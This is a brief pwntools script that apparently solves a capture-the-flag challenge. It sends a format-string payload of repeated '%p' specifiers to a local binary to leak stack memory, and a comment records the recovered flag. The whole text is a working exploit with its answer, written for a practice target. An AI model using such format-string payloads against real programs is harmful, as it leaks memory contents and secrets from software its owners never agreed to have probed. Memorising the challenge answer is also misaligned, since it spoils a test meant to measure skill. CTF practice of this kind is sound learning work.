from pwn import *

p = process('./Formatstring-leak-flag-in-mem-stack')
buff = 0x804a060
sec = 0xffffcedc
payload = b"%p" * 20 

p.sendline(payload)
p.interactive()

#hex to text KMA{AAAAAAAA_YOU_GOT_SOME_TALENT}
